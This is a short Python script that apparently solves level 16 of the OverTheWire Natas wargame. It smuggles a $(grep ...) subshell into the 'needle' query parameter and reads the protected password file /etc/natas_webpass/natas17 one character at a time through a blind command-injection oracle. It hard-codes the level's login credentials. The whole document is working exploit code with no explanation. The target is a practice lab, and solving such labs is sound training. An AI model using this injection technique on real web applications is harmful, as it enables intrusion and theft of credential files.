
import requests

alnums = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
chosenChars = "bcdghkmnqrswAGHNPQSW357890"
passwd = ""
auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')


for i in range(len(auth[1])):
    for char in alnums:
        string = f'(grep ^{passwd}{char} /etc/natas_webpass/natas17)'
        req = requests.get(f'http://natas16.natas.labs.overthewire.org/index.php?needle=supercomputers${string}',
                           auth=auth
                           )
        if "supercomputers" not in req.text:
            passwd += char
            print(passwd)
            break


print(passwd)
